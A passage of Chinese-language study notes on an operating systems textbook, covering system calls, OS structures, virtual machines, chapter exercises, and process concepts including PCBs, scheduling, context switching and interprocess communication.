可能涉及文件或设备。对于特定设备，需要特定的功能（如刻录CD或DVD驱动器，或清屏）。为了提高效率和进行保护， 用户通常不能直接控制νo设备。因此，操作系统必须提供进行I/O操作的方法。</p></li><li><p><strong>文件系统操作</strong>： 文件系统特别重要。很明显， 程序需要读写文件和目录， 也需要根据文件名来创建和删除文件、搜索一个给定的文件、列出文件信息。最后，有些程序还包括了基于文件所有权的允许或拒绝对文件或目录的访问管理。</p></li><li><p><strong>通信</strong>：在许多情况下，一个进程需要与另一个进程交换信息。这种通信有两种主要形式。一种是发生在同一台计算机运行的两个进程之间。另一种是运行在由网络连接起来<br>的不同的计算机上的进程之间。通信可以通过共事冲序来实现，也可通过信息交换技术来实现（对于消息交换，消息包通过操作系统在进程之间移动）。</p></li><li><p><strong>错误检测</strong>：操作系统需要时刻知道可能出现的错误。</p></li><li><p><strong>资源分配</strong>：当多个用户或多个作业同时运行时，必须为每一个分配资源。</p></li><li><p><strong>统计</strong>：跟踪记录那些用户使用了多少资源和什么类型的资源。</p></li><li><p><strong>保护和安全</strong>：多进程并发执行时，一个进程不能干预另一个进程或操作系统本身。</p></li></ul><h2 id="22-操作系统的用户界面"><a class="markdownIt-Anchor" href="#22-操作系统的用户界面"></a> 2.2 操作系统的用户界面</h2><h3 id="221-命令解释程序"><a class="markdownIt-Anchor" href="#221-命令解释程序"></a> 2.2.1 命令解释程序</h3><p>具有多个命令解释程序选择的系统中， 解释程序被称为外壳(Shell）。例如，在UNIX 和Linux 系统中，有多种不同的Shell 可供用户选择，包括：Bourne Shell、C Shell、Bourne-Again Shell、Korn Shell 等。</p><h3 id="222-图形用户界面"><a class="markdownIt-Anchor" href="#222-图形用户界面"></a> 2.2.2 图形用户界面</h3><p>与用户通过命令行直接输入命令不同， GUI 允许提供基于鼠标的窗口和菜单系统作为接口。</p><h2 id="23-系统调用"><a class="markdownIt-Anchor" href="#23-系统调用"></a> 2.3 系统调用</h2><p>系统调用Csystem call）提供了操作系统提供的有效服务界面。</p><p>系统调用提供了进程与操作系统之间的接口</p><p><strong>系统调用</strong></p><p>操作系统服务的编程接口<br>通常由高级语言编写（C或C++）<br>程序访问通常通过高层次 的API接口（C标准库的库函数）而不是直接进行系统调用<br>每个系统调用对应一个系统调用编号</p><h3 id="系统调用与函数调用的区别"><a class="markdownIt-Anchor" href="#系统调用与函数调用的区别"></a> <strong>！！！系统调用与函数调用的区别</strong></h3><p><strong>系统调用</strong></p><ol><li><p>使用INT和IRET指令，内核和应用程序使用的是不同的堆栈，因此存在堆栈的切换，从用户态切换到内核态，从而可以使用特权指令操控设备</p></li><li><p>依赖于内核，不保证移植性</p></li><li><p>在用户空间和内核上下文环境间切换，开销较大</p></li><li><p>是操作系统的一个入口点</p></li></ol><p><strong>函数调用</strong></p><ol><li>使用CALL和RET指令，调用时没有堆栈切换</li><li>平台移植性好</li><li>属于过程调用，调用开销较小</li><li>一个普通功能函数的调用</li></ol><h3 id="api与系统调用"><a class="markdownIt-Anchor" href="#api与系统调用"></a> API与系统调用</h3><p><strong>API</strong>是函数的定义，规定了这个函数的功能，跟内核无直接关系。</p><p><strong>系统调用</strong>是通过中断向内核发请求，实现内核提供的某些服务。</p><p><strong>联系</strong>：一个API可能会需要一个或多个系统调用来完成特定功能。通俗点说就是如果这个api需要跟内核打交道就需要系统调用，否则不需要。 程序员调用的是API（API函数），然后通过与系统调用共同完成函数的功能。</p><p>API是一个提供给应用程序的接口，一组函数，是与程序员进行直接交互的。 系统调用则不与程序员进行交互的，它根据API函数，通过一个软中断机制向内核提交请求，以获取内核服务的接口。</p><p>并不是所有的API函数都一一对应一个系统调用。一个API函数可能需要几个系统调用来共同完成函数的功能。一些API函数不需要调用相应的系统调用（因此它所完成的不是内核提供的服务）</p><p><img src="/posts/8ce3e425/image-20211114112604666.png" alt="image-20211114112604666"></p><h2 id="24-系统调用类型"><a class="markdownIt-Anchor" href="#24-系统调用类型"></a> 2.4 系统调用类型</h2><h3 id="241-进程控制"><a class="markdownIt-Anchor" href="#241-进程控制"></a> 2.4.1 进程控制</h3><ul><li>结束， 放弃</li><li>装入， 执行</li><li>创建进程， 终止进程</li><li>取得进程属性， 设置进程属性</li><li>等待时间</li><li>等待事件， 唤醒事件</li><li>分配和释放内存</li></ul><h3 id="242-文件管理"><a class="markdownIt-Anchor" href="#242-文件管理"></a> 2.4.2 文件管理</h3><ul><li>创建文件， 删除文件</li><li>打开， 关闭</li><li>读、写、重定位</li><li>取得文件属性， 设置文件属性</li></ul><h3 id="243-设备管理"><a class="markdownIt-Anchor" href="#243-设备管理"></a> 2.4.3 设备管理</h3><ul><li>请求设备， 释放设备</li><li>读、写、重定位</li><li>取得设备属性， 设置设备属性</li><li>逻辑连接或断开设备</li></ul><h3 id="244-信息维护"><a class="markdownIt-Anchor" href="#244-信息维护"></a> 2.4.4 信息维护</h3><ul><li>读取时间或日期， 设置时间或日期</li><li>读取系统数据， 设置系统数据</li><li>读取进程， 文件或设备属性</li><li>设置进程， 文件或设备属性</li></ul><h3 id="245-通信"><a class="markdownIt-Anchor" href="#245-通信"></a> 2.4.5 通信</h3><ul><li>创建， 删除通信连接</li><li>发送， 接受消息</li><li>传递状态消息</li><li>连接或断开远程设备</li></ul><h2 id="25-系统程序"><a class="markdownIt-Anchor" href="#25-系统程序"></a> 2.5 系统程序</h2><p>系统程序提供了一个方便的环境， 以开发程序和执行程序。其中一小部分只是系统调用的简单接口， 其他的可能是相当复杂的。它们可分为如下几类：</p><ul><li><strong>文件管理</strong>：这些程序创建、删除、复制、重新命名、打印、转储、列出和操作文件和目录。</li><li><strong>状态信息</strong>：一些程序从系统那里得到日期、时间、可用内存或磁盘空间的数量、用户数或类似状态信息。另一些更为复杂， 能提供详细的性能、登录和调试信息。通常， 这些信息经格式化后，再打印到终端、输出设备或文件， 或在GUI的窗体上显示。有些系统还支持注册衰，它被用于存储和检索配置信息。</li><li><strong>文件修改</strong>：－ 有多个编辑器可以创建和修改位于磁盘或其他存储设备上的文件内容。也可能有特殊的命令被用于查找文件内容或完成文本的转换。</li><li><strong>程序语言支持</strong>： 常用程序设计语言（如C、C＋＋、Java、Visual Basic和Perl等〉的编译程序、汇编程序、调试程序和解释程序通常与操作系统一起提供给用户。</li><li><strong>程序装入和执行</strong>：一旦程序汇编或编译后， 它必须装入内存才能执行。系统可能要提供绝对加载程序、重定位加载程序、链接编辑器和覆盖式加载程序。系统还需要有高级语言或机器语言的调试程序。</li><li><strong>通信</strong>：这些程序提供了在进程、用户和计算机系统之间创建虚拟连接的机制。它们允许用户在互相的屏幕上发送消息， 浏览网页， 发送电子邮件， 远程登录， 从一台机器向另一台机器传送文件。</li></ul><h3 id="26-操作系统设计和实现"><a class="markdownIt-Anchor" href="#26-操作系统设计和实现"></a> 2.6 操作系统设计和实现</h3><h3 id="261-设计目标"><a class="markdownIt-Anchor" href="#261-设计目标"></a> 2.6.1 设计目标</h3><h3 id="262-机制与策略"><a class="markdownIt-Anchor" href="#262-机制与策略"></a> 2.6.2 机制与策略</h3><h3 id="263-实现"><a class="markdownIt-Anchor" href="#263-实现"></a> 2.6.3 实现</h3><h2 id="27-操作系统结构"><a class="markdownIt-Anchor" href="#27-操作系统结构"></a> 2.7 操作系统结构</h2><h4 id="271-简单结构"><a class="markdownIt-Anchor" href="#271-简单结构"></a> 2.7.1 简单结构</h4><p><img src="/posts/8ce3e425/image-20211114121729295.png" alt="image-20211114121729295"></p><p><img src="/posts/8ce3e425/image-20211114121720130.png" alt="image-20211114121720130"></p><h4 id="272-分层方法"><a class="markdownIt-Anchor" href="#272-分层方法"></a> 2.7.2 分层方法</h4><ul><li><p>操作系统被划分为若干层级，每一层都建立在较低层之上</p></li><li><p>模块化</p></li></ul><p><img src="/posts/8ce3e425/image-20211114122235688.png" alt="image-20211114122235688"></p><ul><li><p>优点</p><ul><li>便于构造和调试  简化系统设计和实现</li></ul></li><li><p>不足</p><ul><li>定义和划分困难  效率相对要低一些</li></ul></li></ul><h4 id="273-微内核"><a class="markdownIt-Anchor" href="#273-微内核"></a> 2.7.3 微内核</h4><ul><li><p>这种方法将所有非基本部分从内核中移走，并将它们当做系统级程序和用户级程序来实现，用这种方法来构建操作系统</p></li><li><p>用户模块之间采用消息传递的方式进行通信</p></li><li><p>优点</p><ul><li>微内核易于扩展</li><li>易于提升OS至一个新的体系结构</li><li>更可靠（内核模式中运行的代码更少）</li><li>更安全</li></ul></li><li><p>缺点</p><ul><li>用户空间与内核空间的通信代价较高</li></ul></li></ul><h4 id="274-模块"><a class="markdownIt-Anchor" href="#274-模块"></a> 2.7.4 模块</h4><p>用面向对象编程技术来生成模块化的内核。这里， 内核有一组核心部件， 以及在启动或运行时对附加服务的动态链接。</p><ul><li>用面向对象的方法</li><li>内核的组成部分相互分离</li><li>任务之间的交互通过已知的接口来实现</li><li>每个模块在内核中是按照需要可装载的</li><li>比分层系统更为灵活</li><li>比微内核更高效（不需要调用消息传递来通信）</li></ul><p><img src="/posts/8ce3e425/image-20211114122827683.png" alt="image-20211114122827683"></p><h2 id="28-虚拟机"><a class="markdownIt-Anchor" href="#28-虚拟机"></a> 2.8 虚拟机</h2><h3 id="281-实现"><a class="markdownIt-Anchor" href="#281-实现"></a> 2.8.1 实现</h3><p>虚拟机是.通过软件模拟的具有完整硬件系统功能的、运行在一个完全隔离环境中的完整计算机系统。</p><p>虚拟机的基本思想是单个计算机(CPU、 内存、 磁盘、 网卡等〉的硬件抽象为几个不同的执行部件， 从而造成一种 “ 幻觉，仿佛每个独立的执行环境都在自己的计算机上运行一样。</p><ul><li>虚拟机采用了分层的方法。它将物理硬件和OS内核统一看作为硬件</li><li>虚拟机提供了与基本硬件相同的接口</li><li>通过利用CPU调度和虚拟内存技术，操作系统能创建一种“幻觉”，以至于进程认为有自己的处理器和自己的（虚拟）内存。</li></ul><h3 id="282-优点"><a class="markdownIt-Anchor" href="#282-优点"></a> 2.8.2 优点</h3><ul><li>通过完全保护系统资源，虚拟机提供了一个坚实的安全层</li><li>虚拟机允许进行系统开发而不必中断正常的系统操作</li></ul><p>缺点</p><ul><li>虚拟机概念很难提供真实的硬件效果</li></ul><h3 id="283-实例"><a class="markdownIt-Anchor" href="#283-实例"></a> 2.8.3 实例</h3><h2 id="29-系统生成"><a class="markdownIt-Anchor" href="#29-系统生成"></a> 2.9 系统生成</h2><h2 id="210-系统启动"><a class="markdownIt-Anchor" href="#210-系统启动"></a> 2.10 系统启动</h2><h2 id="211-小结"><a class="markdownIt-Anchor" href="#211-小结"></a> 2.11 小结</h2><h2 id="212-习题"><a class="markdownIt-Anchor" href="#212-习题"></a> 2.12 习题</h2><p><strong>2.1 操作系统提供的服务和功能可以主要分为两大类。简要描述这两大类并讨论它们的区别。</strong></p><blockquote><p>第一种操作系统提供的服务是<strong>用来保护在系统中同时运行的不同进程</strong>。进程只被允许获得与它们地址空间有联系的内存位置。同样，进程不允许破坏和其他用户有关的文件。一个进程同样不允许在没有操作系统的干预<br>下直接进入设备。</p><p>第二种服务由操作系统提供的服务是<strong>提供一种新的功能，而这种功能并不直接被底层的硬件支持</strong>。虚拟存储器和文件系统就是由操作系统提供的这种新服务的实例。</p></blockquote><p><strong>2.2 列出操作系统提供使用户更为方便地使用计算机系统的5个服务，并说明在哪些情况下用户级程序不能够提供这些服务。请解释为什么。</strong></p><blockquote><p>2.1操作系统服务</p></blockquote><p><strong>2.3 给出三种向操作系统传递参数的常用方法。</strong></p><blockquote><ol><li>通过寄存器来传递参数</li><li>寄存器传递参数块的首地址</li><li>参数通过程序存放或压进堆栈中， 并通过操作系统弹出堆栈。</li></ol></blockquote><p><strong>2.4 介绍一下如何获得一个程序在执行其不同部分的代码时所耗时间的统计简衰。讨论获得该统计简表的重要性。</strong></p><p><strong>2.5 操作系统关于文件管理的5个主要功能是什么？</strong></p><blockquote><p>2.4.2</p></blockquote><p><strong>2.6 操作文件和设备时，采用同样的系统调用界面有什么优点和缺点？</strong></p><p><strong>2.7 命令解释器的用途是什么？为什么它经常是与内核分开的？是否可能采用操作系统提供的系统调用接口为用户开发一个新的命令解释器？</strong></p><p><strong>！！！2.8 进程间通信的两个模式是什么？这两种方法有何长处和缺点？</strong></p><blockquote><p>共享内存系统</p><ul><li><p>优点</p><ul><li>最快的一种通信方式，多个进程可同时访问同一片内存空间，相对其他方式来说具有更少的数据拷贝，效率较高。</li><li>随内核持续，相比于随进程持续生命力更强。</li></ul></li><li><p>缺点</p><p>需要结合信号量</p><p>或其他方式来实现多个进程间同步，自身不具备同步机制。</p></li></ul><p>消息传递系统</p><ul><li>优点<ul><li>可以实现通信进程间的同步</li></ul></li><li>缺点<ul><li>效率较低</li></ul></li></ul></blockquote><p><strong>2.9 为什么要将机制和策略区分开来？</strong></p><p><strong>2.10 为什么Java提供从Java程序调用以C或C＋＋编写的本地方法？举出一个本地方法的例子。</strong></p><p><strong>2.11 如果操作系统的两个部件相互依赖，有时实现分层方法会很困难． 请区别两个功能紧密耦合的系统部件如何分层。</strong></p><p><strong>！！！2.12 系统设计采用微内核设计的主要优点是什么？用户程序和系统服务在微内核结构内如何相互影响？采用微内核设计的缺点又是什么？</strong></p><blockquote><p>优点主要包括以下几点：</p><ul><li><p><strong>灵活性高易拓展</strong>,增加一个新的服务不需要修改内核</p></li><li><p>在用户模式中中比在内核模式中<strong>更安全</strong>、更易操作</p></li><li><p>一个简单的内核设计和功能一般导致一个<strong>更可靠</strong>的操作系统</p></li><li><p><strong>可移植性强</strong></p></li><li><p>易于提升OS至一个新的体系结构</p></li></ul><p>用户程序和系统服务通过使用进程件的通信机制在微内核中相互作用，例如发送消息。这些消息由操作系统运送。</p><p>缺点是</p><ul><li>与进程间通信的过度联系和为了保证用户程序和系统服务相互作用而频繁使用操作系统的消息传递功能。使得<strong>效率较低</strong></li></ul></blockquote><p><strong>2.13 模块化内核方法和分层方法在哪些方面类似？哪些方面不同？</strong></p><blockquote><p>二者的相似之处在于实现了系统的模块化设计，每一部分都对外提供接口，便于对系统进行维护和修改。</p><p>二者的区别在于模块化内核方法比分层方法更为灵活，它的任一模块都能调用任何其他模块，提高了系统效率；而分层方法通过层层的系统调用实现上层与下层模块之间的通信，增加了系统开销。</p></blockquote><p><strong>2.14 操作系统设计员采用虚拟机结构的主要优点是什么？对用户来说主要有什么好处？</strong></p><p><strong>2.15 为什么说一个TIT (just-in-time）编译器对执行一个Java程序是有用的？</strong></p><p><strong>2.16 在VMware这样的系统中，客户操作系统与主操作系统有什么关系？选择主操作系统要考虑什么因素？</strong></p><h1 id="第3章-进程"><a class="markdownIt-Anchor" href="#第3章-进程"></a> 第3章 进程</h1><h2 id="31-进程概念"><a class="markdownIt-Anchor" href="#31-进程概念"></a> 3.1 进程概念</h2><h3 id="311-进程"><a class="markdownIt-Anchor" href="#311-进程"></a> 3.1.1 进程</h3><p><strong>进程</strong>：是一个可并发执行的具有独立功能的程序关于某个数据集合的一次执行过程，也是操作系统进行资源分配和保护的基本单位。</p><p><strong>进程和程序的区别</strong></p><ul><li><p><strong>进程</strong>反映的是一个动态概念，而<strong>程序</strong>是一个静态概念；程序是指令的有序集合，没有任何执行的含义，而进程则强调的是执行过程，它动态被创建、执行和消亡。</p></li><li><p><strong>进程</strong>是一个能独立运行的单位，能与其他进程并发执行，进程是作为资源申请和调度单位存在的。而<strong>程序</strong>则没有。因为程序不反映执行过程。</p></li><li><p>程序和进程并不一定具有一一对应的关系。不同的进程可以来自于同一程序，只要该程序所对应的数据集不同。</p></li></ul><p>进程包括文本段、堆栈段（包括临时数据，如函数参数、返回地址和局部变量）、数据段（包括全局变量）、堆（进程运行时动态分配的内存）</p><p><img src="/posts/8ce3e425/image-20210622073331434.png" alt="image-20210622073331434"></p><p><img src="/posts/8ce3e425/image-20211024142834120.png" alt="内存中的进程"></p><p><strong>进程的内存映像：</strong></p><p><img src="/posts/8ce3e425/image-20220109122113919.png" alt="image-20220109122113919"></p><h3 id="312-进程状态"><a class="markdownIt-Anchor" href="#312-进程状态"></a> 3.1.2 进程状态</h3><p>进程在执行时会改变状态。进程状态在某种程度上是由当前活动所定义的。每个进程可能处于下列状态之一：</p><ul><li>新的：进程正在被创建。</li><li>运行： 指令正在被执行。</li><li>等待：进程等待某个事件的发生（如I/O完成或收到信号）。</li><li>就绪：进程等待分配处理器。</li><li>终止：进程完成执行。</li></ul><p><img src="/posts/8ce3e425/image-20211024144135058.png" alt="image-20211024144135058"></p><h3 id="313-进程控制块"><a class="markdownIt-Anchor" href="#313-进程控制块"></a> 3.1.3 进程控制块</h3><p>每个进程在操作系统内用进程控制块（process control block, PCB ，也称为任务控制块）来表示。</p><p>图3.3 给出了一个PCB 的例子， 它包含许多与一个特定进程相关的信息。</p><p><img src="/posts/8ce3e425/image-20211024144308211.png" alt="image-20211024144308211"></p><ul><li>进程状态：状态可包括新的、就绪、运行、等待、停止等。</li><li>程序计数器：计数器表示进程要执行的下个指令的地址。</li><li>CPU 寄存器：根据计算机体系结构的不同， 寄存器的数量和类型也不同。它们包括累加器、索引寄存器、堆钱指针、通用寄存器和其他条件码信息寄存器。与程序计数器一起，这些状态信息在出现中断时也需要保存， 以便进程以后能正确地继续执行（见图3.4)。</li><li>CPU 调度信息：这类信息包括进程优先级、调度队列的指针和其他调度参数（第5章讨论进程调度）。</li><li>内存管理信息： 根据操作系统所使用的内存系统， 这类信息包括基址和界限寄存器的值、页表或段表（见第8章）。</li><li>记账信息：这类信息包括CPU时间、实际使用时间、时间界限、记账数据、作业或进程数量等。</li><li>I/O状态信息：这类信息包括分配给进程的I/O设备列表、打开的文件列表等。</li></ul><p><img src="/posts/8ce3e425/image-20211024144700188.png" alt="image-20211024144700188"></p><p><strong>PCB的作用</strong></p><ul><li>PCB可唯一标识一个进程</li><li>PCB中的信息为进程的控制提供依据</li><li>PCB将程序变成了进程</li><li>PCB是进程在系统中存在的唯一标志</li></ul><h3 id="314-线程"><a class="markdownIt-Anchor" href="#314-线程"></a> 3.1.4 线程</h3><p>迄今为止所讨论的进程模型暗示： 一个进程是一个只能进行单个执行线程的程序。例如， 如果一个进程运行一个字处理器程序， 那么只能执行单个线程指令。这种单一控制线程使得进程一次只能执行一个任务。例如， 用户不能在同一进程内， 同时输入字符和进行拼写检查。</p><p>许多现代操作系统扩展了进程概念以支持一次能执行多个线程。第4章将讨论多线程进程。</p><h2 id="32-进程调度"><a class="markdownIt-Anchor" href="#32-进程调度"></a> 3.2 进程调度</h2><p>多道程序设计的目的是无论何时都有进程在运行，从而使CPU利用率达到最大化。</p><p>分时系统的目的是在进程之间快速切换CPU以便用户在程序运行时能与其进行交互。</p><h3 id="321-调度队列"><a class="markdownIt-Anchor" href="#321-调度队列"></a> 3.2.1 调度队列</h3><p>讨论进程调度的常用表示方法是队列图， 如图3.7 所示。每个长方形表示一个队列。<br>有两种队列： 就绪队列和一组设备队列。圆形表示为队列服务的资源， 箭头表示系统内进程的流向。</p><p>新进程开始处于就绪队列。它在就绪队列中等待直到被选中执行或被派遣。当进程分配到CPU 并执行时， 可能发生下面几种事件中的一种：</p><ul><li>进程可能发出一个I/O请求， 并被放到I/O队列中。</li><li>进程可能创建一个新的子进程， 并等待其结束。</li><li>进程可能会由于中断而强制释放CPU， 并被放回到就绪队列中。</li></ul><p>对于前两种情况， 进程最终从等待状态切换到就绪态， 并放回到就绪队列中。进程继续这一循环直到终止， 到时它将从所有队列中删除， 其PCB 和资源将得以释放。</p><p><img src="/posts/8ce3e425/image-20211025195355812.png" alt="image-20211025195355812"></p><h3 id="322-调度程序"><a class="markdownIt-Anchor" href="#322-调度程序"></a> 3.2.2 调度程序</h3><p>进程在其生命周期中会在各种调度队列之间迁移。为了调度， 操作系统必须按某种方式从这些队列中选择进程。进程选择是由相应的<strong>调度程序</strong>（ scheduler ）来执行的。</p><p>通常对于批处理系统， 进程更多地是被提交， 而不是马上执行。这些进程被放到大容量存储设备（通常为磁盘〉的缓冲池中，保存在那里以便以后执行。</p><p><strong>长期调度程序</strong>（long-term scheduler ）或作业调度程序（job scheduler ） 从缓冲池中选择进程， 并装入内存以准备执行。</p><p><strong>短期调度程序</strong>（ short-term scheduler ）或CPU 调度程序从准备执行的进程中选择进程， 并为之分配CPU。</p><p>这两个调度程序的<strong>主要差别</strong>是它们执行的频率。</p><p><strong>中期调度程序</strong>的核心思想是能将进程从内存（或从CPU 竞争）中移出， 从而降低多道程序设计的程度。之后， 进程能被重新调入内存， 并从中断处继续执行。</p><p><img src="/posts/8ce3e425/image-20211025200346176.png" alt="image-20211025200346176"></p><h3 id="323-上下文切换"><a class="markdownIt-Anchor" href="#323-上下文切换"></a> 3.2.3 上下文切换</h3><p>当发生一个中断时，系统需要保存当前运行在CPU 中进程的上下文， 从而在其处理完后能恢复上下文， 即先中断进程， 之后再继续。</p><p><strong>进程上下文</strong>用进程的PCB 表示， 它包括CPU 寄存器的值、进程状态（见图3.2） 和内存管理信息等。通常，通过执行一个<strong>状态保存</strong>（ state save） 来保存CPU当前状态（不管它是内核模式还是用户模式）， 之后执行一个<strong>状态恢复</strong>（ state restore）重新开始运行。</p><p>将CPU切换到另一个进程需要保存当前进程的状态并恢复另一个进程的状态，这一任务称为<strong>上下文切换</strong>（ context switch）。当发生上下文切换时， 内核会将旧进程的状态保存在其PCB中，然后装入经调度要执行的并己保存的新进程的上下文。</p><h2 id="33-进程操作"><a class="markdownIt-Anchor" href="#33-进程操作"></a> 3.3 进程操作</h2><h3 id="331-进程创建"><a class="markdownIt-Anchor" href="#331-进程创建"></a> 3.3.1 进程创建</h3><p>进程在其执行过程中， 能通过创建进程系统调用（ create-process system call） 创建多个新进程。创建进程称为父进程， 而新进程称为子进程。每个新进程可以再创建其他进程，从而形成了进程树。</p><p><strong>创建过程</strong></p><ul><li><p>申请空白PCB</p></li><li><p>分配资源</p></li><li><p>初始化PCB</p></li><li><p>插入就绪队列</p></li></ul><p>进程创建实质上是生成一个PCB</p><p><img src="/posts/8ce3e425/image-20211114152544023.png" alt="image-20211114152544023"></p><p>当进程创建新进程时， 有两种执行可能：<br>①父进程与子进程并发执行。<br>②父进程等待， 直到某个或全部子进程执行完。</p><p>新进程的地址空间也有两种可能：<br>①子进程是父进程的复制品（具有与父进程相同的程序和数据）。<br>②子进程装入另一个新程序。</p><p><img src="/posts/8ce3e425/image-20211025201136927.png" alt="image-20211025201136927"></p><p><strong>fork实例：</strong></p><p><img src="/posts/8ce3e425/image-20220109122155530.png" alt="image-20220109122155530"></p><h3 id="332-进程终止"><a class="markdownIt-Anchor" href="#332-进程终止"></a> 3.3.2 进程终止</h3><p><strong>进程终止的过程</strong></p><ul><li><p>查找进程</p></li><li><p>查找该进程的PCB</p></li><li><p>中止执行</p></li><li><p>终止子进程</p></li><li><p>归还资源</p></li><li><p>将PCB从所在队列移出</p></li><li><p>释放PCB</p></li></ul><p><img src="/posts/8ce3e425/image-20211114152857377.png" alt="image-20211114152857377"></p><p>当进程完成执行最后的语句并使用系统调用exit()请求操作系统删除自身时， 进程终止。这时， 进程可以返回状态值（通常为整数〉到父进程（通过系统调用wait（））。所有进程资源（包括物理和虚拟内存、打开文件和I/O缓冲〉会被操作系统释放。</p><p>在其他情况下也会出现终止。进程通过适当的系统调用（如Win32 中的TerminatePorcess（）） 能终止另一个进程。通常， 只有被终止进程的父进程才能执行这一系统调用。否则， 用户可以任意地终止彼此的作业。</p><h3 id="333-进程阻塞"><a class="markdownIt-Anchor" href="#333-进程阻塞"></a> 3.3.3 进程阻塞</h3><p><strong>阻塞过程</strong></p><ul><li><p>停止执行</p></li><li><p>更改PCB为阻塞</p></li><li><p>保留现场</p></li><li><p>PCB插入相应阻塞队列</p></li><li><p>提示重新调度</p></li></ul><p><strong>唤醒过程</strong></p><ul><li>根据释放条件寻找相应进程</li><li>改PCB状态为就绪</li><li>将PCB插入就绪队列</li></ul><h2 id="34-进程间通信"><a class="markdownIt-Anchor" href="#34-进程间通信"></a> 3.4 进程间通信</h2><p><strong>允许进程协作的理由</strong></p><ul><li>信息共享（information sharing）：由于多个用户可能对同样的信息感兴趣（例如共享的文件）， 所以必须提供环境以允许对这些信息进行并发访问。</li><li>提高运算速度（computation speedup）： 如果希望一个特定任务快速运行， 那么必须将它分成子任务，每个子任务可以与其他子任务并行执行。注意，如果要实现这样的加速，需要计算机有多个处理单元（例如CPU或I/0通道）。</li><li>模块化（modularity）：可能需要按模块化方式构造系统， 如第2章所讨论， 可将系统功能分成独立进程或线程。</li><li>方便（convenience）：单个用户也可能同时执行许多任务。例如，一个用户可以并行进行编辑、打印和编译操作。</li></ul><p>进程间通信有两种基本模式：</p><p><strong>(1) 共享内存</strong></p><p>在共享内存模式中， 建立起一块供协作进程共享的内存区域， 进程通过向此共享区域读或写入数据来交换信息。</p><p><strong>(2) 消息传递</strong></p><p>在消息传递模式中，通过在协作进程间交换消息来实现通信。</p><p>图3.13 给出了这两种模式的对比。</p><p><img src="/posts/8ce3e425/image-20211026154454752.png" alt="image-20211026154454752"></p><h3 id="341-共享内存系统"><a class="markdownIt-Anchor" href="#341-共享内存系统"></a> 3.4.1 共享内存系统</h3><p>采用共享内存的进程间通信需要通信进程建立<strong>共享内存区域</strong>。通常， 一块共享内存区域驻留在生成共享内存段进程的地址空间。其他希望使用这个共享内存段进行通信的进程必须将此放到它们自己的地址空间上。</p><p>采用共享内存是解决生产者一消费者问题方法中的一种。为了允许生产者进程和消费进程能并发执行， 必须要有一个缓冲来被生产者填充并被消费者所使用。此缓冲驻留在生产者进程和消费者进程的共享内存区域内， 当消费者使用一项时， 生产者能产生另一项。生产者和消费者必须同步， 以免消费者消费一个没有生产出来的项。</p><p>可以使用两种缓冲。<strong>无限缓冲</strong>（unbounded-buffer）对缓冲大小没有限制。消费者可能不得不等待新的项， 但生产者总是可以产生新项。有限缓冲（ bounded-buffer）假设缓冲大小固定。对于这种情况， 如果缓冲为空， 那么消费者必须等待：如果缓冲为满， 那么生产者必须等待。</p><p>共享缓冲是通过循环数组和两个逻辑指针来实现的： in 和out。变量in 指向缓冲中下一个空位： out 指向缓冲中的第一个满位。当in==out 时， 缓冲为空： (in+1)%BUFFER_SIZE= out 时，缓冲为满。</p><p><img src="/posts/8ce3e425/image-20211026155644352.png" alt="image-20211026155644352"></p><h3 id="342-消息传递系统"><a class="markdownIt-Anchor" href="#342-消息传递系统"></a> 3.4.2 消息传递系统</h3><p>消息传递提供一种机制以允许进程不必通过共享地址空间来实现通信和同步。</p><p>消息传递工具提供至少两种操作：发送（消息） 和接收（消息） 。</p><ol><li><p><strong>命名</strong></p><p><strong>直接通信</strong>:</p><p>对于<strong>直接通信</strong>， 需要通信的每个进程必须明确地命名通信的接收者或发送者。采用这种方案， 原语send()和receive()定义如下：</p><ul><li>send(P,message）：发送消息到进程P。</li><li>receive(Q, message）： 接收来自进程Q的消息。</li></ul><p>这种方案的通信线路具有如下属性：</p><ul><li>在需要通信的每对进程之间自动建立线路。进程仅需知道相互通信的标识符。</li><li>一个线路只与两个进程相关。</li><li>每对进程之间只有一个线路。</li></ul><p>这种方案展示了<strong>对称寻址</strong>， 即发送和接收进程必须命名对方以便通信。</p><p>这种方案一个变形采用<strong>非对称寻址</strong>， 即只要发送者命名接收者， 而接收者不需要命名发送者。采用这种方案， 原语send()和receive()定义如下：</p><ul><li>send(P,message）：发送消息到进程P。</li><li>receive(id, message）：接收来自任何进程的消息，变量id设置成与其通信的进程名称。</li></ul><p>对称和非对称寻址方案的<strong>缺点</strong></p><ul><li>是限制了进程定义的模块化。改变进程的名称可能必须检查所有其他进程定义。所有旧名称的引用都必须找到， 以便修改成为新名称。</li><li>有可能造成依赖于特定的操作系统，因为不同操作系统对进程的ID号的指定方式可能不一致；</li><li>每对进程间只能够建立一条链路是一个重大的缺陷。</li></ul><p><strong>间接通信</strong>:</p><p>在<strong>间接通信</strong>中， 通过邮箱或端口来发送和接收消息。邮箱可以抽象成一个对象， 进程可以向其中存放消息，也可从中删除消息，每个邮箱都有一个唯一的标识符。例如，POSIX消息队列采用一个整数值来标识一个邮箱。对于这种方案， 一个进程可能通过许多不同的邮箱与其他进程通信， 但两个进程仅在其共享至少一个邮箱时可相互通信。原语send()和receive()定义如下：</p><ul><li>send(A , message）：发送一个消息到邮箱A。</li><li>receive(A, message）： 接收来自邮箱A 的消息。</li></ul><p>对于这种方案， 通信线路具有如下属性：</p><ul><li>只有在两个进程共享一个邮箱时， 才能建立通信线路。</li><li>一个线路可以与两个或更多的进程相关联。</li><li>两个通信进程之间可有多个不同的线路， 每个线路对应于一个邮箱。</li></ul></li><li><p><strong>同步</strong></p><p>进程间的通信可以通过调用原语send（）和receiveO来进行。这些原语的实现有不同的设计选项。消息传递可以是阻塞或非阻塞一一一也称为同步或异步。</p><ul><li>阻塞send：发送进程阻塞，直到消息被接收进程或邮箱所接收。</li><li>非阻塞send：发送进程发送消息并再继续操作。</li><li>阻塞receive：接收者阻塞，直到有消息可用。</li><li>非阻塞receive：接收者收到一个有效消息或空消息。</li></ul><p>send（）和receive（）可以进行多种组合。当send（）和receive（）都阻塞时，则在发送者和接收者之间就有一个集合点（rendezvous）。当使用阻塞sendO和receive(）时，如何解决生产者－消费者问题就不再重要了。生产者仅需调用阻塞send（）调用并等待，直到消息被送到接收者或邮箱。同样地，当消费者调用receive（）时，发生阻塞直到有一个消息可用。</p></li><li><p><strong>缓冲</strong></p><p>不管通信是直接的或是间接的， 通信进程所交换的消息都驻留在临时队列中。简单地讲， 队列实现有三种方法：</p><ul><li>零容量：队列的最大长度为0：因此， 线路中不能有任何消息处于等待。对于这种<br>情况， 必须阻塞发送， 直到接收者接收到消息。</li><li>有限容量：队列的长度为有限的n： 因此， 